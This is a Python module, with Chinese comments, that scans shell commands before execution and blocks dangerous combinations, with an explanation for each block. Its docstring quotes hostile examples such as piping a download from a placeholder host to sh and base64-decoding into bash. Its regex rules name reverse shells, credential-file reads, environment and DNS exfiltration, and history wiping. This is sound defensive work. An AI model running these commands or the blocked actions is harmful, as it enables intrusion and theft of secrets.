"""`tirith`：执行前的**组合**风险扫描。

## 与 `app/approvals.py` 的分工（别把两层混成一件事）

`approvals` 判的是**单条命令**像不像危险动作——`rm -rf /`、`mkfs`、`diskpart` 这类，
用 18 条硬地板 + 38 条危险模式逐条匹配。它的盲区是**组合**：

    curl https://x/s.sh | sh          # 单独看 curl 无害、sh 也无害
    find . -name '*.log' -exec rm {} \\;   # 单独看 find 无害
    echo $DATA | base64 -d | bash     # 单独看每段都无害
    history -c && ./cleanup.sh        # 单独看是两个常规命令

这些才是真实入侵脚本的形状。`tirith` 补的就是这一层：**跨管道、跨 `&&`/`;`、
跨命令替换的组合语义**。所以它是 approvals 之后的第二道，不是替代。

## 为什么不追求"完整沙箱"

真正的执行前隔离要靠容器/命名空间/系统调用过滤，Orbit 是单机应用，没有那层。
这里能做的是**在把字符串交给 shell 之前**把明显的恶意形状拦下来，并在拒绝时
说清楚"是哪一段组合触发的"——用户要能自己判断这是误报还是真事。
"""

from __future__ import annotations

import json
import re
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

#: 严重度排序。`block_at` 取其中之一，达到或超过就拦。
SEVERITIES = ("low", "medium", "high", "critical")
_RANK = {name: index for index, name in enumerate(SEVERITIES)}

#: 默认拦到 `high`：`medium` 里有些是正常运维动作（如 `chmod -R`），拦了会误伤。
DEFAULT_BLOCK_AT = "high"


@dataclass(frozen=True)
class Finding:
    """一条命中。`detail` 要说清"哪一段"，否则用户无法判断真假。"""

    kind: str
    severity: str
    detail: str

    def as_dict(self) -> dict[str, str]:
        return {"kind": self.kind, "severity": self.severity, "detail": self.detail}


@dataclass
class ScanResult:
    command: str
    findings: list[Finding] = field(default_factory=list)
    blocked: bool = False
    block_at: str = DEFAULT_BLOCK_AT
    enabled: bool = True

    @property
    def severity(self) -> str:
        if not self.findings:
            return "none"
        return max((item.severity for item in self.findings), key=lambda name: _RANK[name])

    def as_dict(self) -> dict[str, Any]:
        return {
            "command": self.command,
            "enabled": self.enabled,
            "severity": self.severity,
            "blocked": self.blocked,
            "block_at": self.block_at,
            "findings": [item.as_dict() for item in self.findings],
        }


# ── 规则 ────────────────────────────────────────────────────────────────────

#: 解释器名。用来判断"管道末端是不是在跑代码"。
_SHELLS = r"(?:ba|z|k|da)?sh|python[0-9.]*|perl|ruby|node|php"

#: 下载器名。
_FETCHERS = r"curl|wget|fetch|iwr|invoke-webrequest"

#: 每个规则是 (kind, severity, pattern, 说明)。pattern 用 re.S 匹配整条命令。
#: 说明写"为什么这形状危险"，因为它会原样出现在拒绝信息里。
RULES: tuple[tuple[str, str, re.Pattern[str], str], ...] = (
    (
        "pipe_to_shell",
        "critical",
        re.compile(rf"\b(?:{_FETCHERS})\b[^\n|]*\|\s*(?:sudo\s+)?(?:{_SHELLS})\b", re.I),
        "把网络下载的内容直接管道给解释器执行——等于运行你看不到的代码",
    ),
    (
        "decode_then_run",
        "critical",
        re.compile(rf"\bbase64\b[^\n|]*(?:-d|--decode|-D)[^\n|]*\|\s*(?:sudo\s+)?(?:{_SHELLS})\b", re.I),
        "base64 解码后直接执行——载荷内容在命令里完全不可见",
    ),
    (
        "download_chmod_exec",
        "critical",
        re.compile(rf"\b(?:{_FETCHERS})\b[^\n]*(?:&&|;)[^\n]*\bchmod\b[^\n]*(?:\+x|0?7[0-7][0-7])[^\n]*(?:&&|;)[^\n]*(?:\./|/tmp/|/var/tmp/)", re.I),
        "下载 → 加执行位 → 运行：典型的二次落地执行链",
    ),
    (
        "eval_of_download",
        "critical",
        re.compile(rf"\beval\b[^\n]*(?:\$\(|`)[^\n]*(?:{_FETCHERS})\b", re.I),
        "eval 一个网络响应——内容不可见且立即执行",
    ),
    (
        "find_exec_destructive",
        "high",
        re.compile(r"\bfind\b[^\n]*-exec\s+(?:sudo\s+)?(?:rm|dd|truncate|shred|mv)\b", re.I),
        "find -exec 调用破坏性命令：作用范围由 find 的条件决定，很容易超出预期",
    ),
    (
        "xargs_destructive",
        "high",
        re.compile(r"\bxargs\b[^\n]*(?:rm|dd|truncate|shred|kill)\b", re.I),
        "xargs 把上游列表喂给破坏性命令：删什么取决于上游输出，事先不可见",
    ),
    (
        "substitution_destructive",
        "high",
        re.compile(r"(?:\$\(|`)[^)`\n]*(?:rm\s+-|dd\s+|shred\s+|mkfs)", re.I),
        "命令替换里藏着破坏性操作：主命令看起来无害，替换部分才是真动作",
    ),
    (
        "history_tamper",
        "high",
        re.compile(r"\b(?:history\s+-c|unset\s+HISTFILE|HISTFILE=/dev/null|export\s+HISTFILESIZE=0)\b", re.I),
        "清除或禁用命令历史——正常运维不需要这一步，它主要用来抹掉痕迹",
    ),
    (
        "log_tamper",
        "high",
        re.compile(r"(?:>\s*/var/log/|rm\s+[^\n]*?/var/log/|truncate\s+[^\n]*?/var/log/)", re.I),
        "清空或删除系统日志——同上，是抹痕迹而不是排障",
    ),
    (
        "credential_read",
        "high",
        re.compile(
            r"(?:cat|type|more|less|head|tail|cp|scp)\b[^\n]*(?:\.ssh/id_|\.aws/credentials|\.netrc|\.git-credentials|\.docker/config\.json|\.kube/config|/etc/shadow)",
            re.I,
        ),
        "读取本机凭证文件：一旦与网络命令同现就是外传，单独出现也值得确认",
    ),
    (
        "env_exfil",
        "critical",
        re.compile(rf"\benv\b[^\n|]*\|\s*(?:{_FETCHERS})\b|\bprintenv\b[^\n|]*\|\s*(?:{_FETCHERS})\b", re.I),
        "把整个环境变量表管道给网络命令——API key 就在里面",
    ),
    (
        "reverse_shell",
        "critical",
        re.compile(r"/dev/(?:tcp|udp)/|bash\s+-i\s+>&|\bnc\b[^\n]*-e\s+(?:/bin/)?(?:ba)?sh", re.I),
        "反弹 shell：把本机的 shell 交给远端",
    ),
    (
        "rc_persistence",
        "medium",
        re.compile(r">>\s*(?:~|\$HOME)?/?\.(?:bashrc|zshrc|profile|bash_profile)\b|\bcrontab\s+[^\s]*\s*-?\s*$", re.I),
        "往 shell 启动文件或 crontab 追加内容——持久化手法，也可能是正常配置",
    ),
    (
        "chmod_recursive_wide",
        "medium",
        re.compile(r"\bchmod\s+(?:-R\s+)?(?:0?777|a\+rwx)\s+(?:/|~|\$HOME)\s*$", re.I),
        "对家目录或根递归放开全部权限——把权限模型一次性打穿",
    ),
    (
        "dns_exfil",
        "medium",
        re.compile(r"\b(?:nslookup|dig|host)\b[^\n]*(?:\$\(|`)", re.I),
        "把命令输出塞进 DNS 查询——经典的低带宽外传通道",
    ),
    (
        "curl_upload",
        "medium",
        re.compile(rf"\b(?:{_FETCHERS})\b[^\n]*(?:\s-T\s|\s--upload-file\s|\s-d\s*@|\s-F\s*[^\s]*=@)", re.I),
        "curl/wget 带本地文件上传——确认目标主机是你认识的",
    ),
)


def resolve_policy(settings) -> tuple[bool, str]:
    """读 `tirith_enabled` / `tirith_block_severity`。

    与 `app/approvals.py` 同一套读法：优先取 settings 字段，其次读
    `<data_dir>/settings.json`，都没有就用默认值。**默认开启**——它是纯静态检查，
    不联网、不改文件，误报的代价只是多看一眼。
    """
    enabled = getattr(settings, "tirith_enabled", None)
    block_at = getattr(settings, "tirith_block_severity", None)
    data_dir = getattr(settings, "data_dir", None)
    if data_dir is not None:
        path = Path(data_dir) / "settings.json"
        try:
            payload = json.loads(path.read_text(encoding="utf-8"))
        except (OSError, ValueError):
            payload = {}
        if isinstance(payload, dict):
            if enabled is None:
                enabled = payload.get("tirith_enabled")
            if block_at is None:
                block_at = payload.get("tirith_block_severity")
    resolved_enabled = True if enabled is None else bool(enabled)
    resolved_block = str(block_at or DEFAULT_BLOCK_AT).lower()
    if resolved_block not in _RANK:
        resolved_block = DEFAULT_BLOCK_AT
    return resolved_enabled, resolved_block


def scan(command: str, *, settings=None, block_at: str | None = None, enabled: bool = True) -> ScanResult:
    """扫描一条待执行命令，返回命中与是否该拦。"""
    text = command or ""
    if settings is not None:
        enabled, policy_block = resolve_policy(settings)
        block_at = block_at or policy_block
    policy_block = (block_at or DEFAULT_BLOCK_AT).lower()
    if policy_block not in _RANK:
        policy_block = DEFAULT_BLOCK_AT

    result = ScanResult(command=text, block_at=policy_block, enabled=enabled)
    if not enabled or not text.strip():
        return result

    for kind, severity, pattern, detail in RULES:
        if pattern.search(text):
            result.findings.append(Finding(kind=kind, severity=severity, detail=detail))

    if result.findings:
        worst = max((item.severity for item in result.findings), key=lambda name: _RANK[name])
        result.blocked = _RANK[worst] >= _RANK[policy_block]
    return result


def refusal(result: ScanResult) -> str:
    """拒绝时给用户看的说明：**逐条列出命中的组合**，而不是只说"被拦了"。"""
    lines = [f"执行前扫描拦下了这条命令（阈值 {result.block_at}）："]
    for item in result.findings:
        lines.append(f"  · [{item.severity}] {item.kind}：{item.detail}")
    lines.append("确认无害后可以拆成单步执行，或调整 tirith_block_severity。")
    return "\n".join(lines)
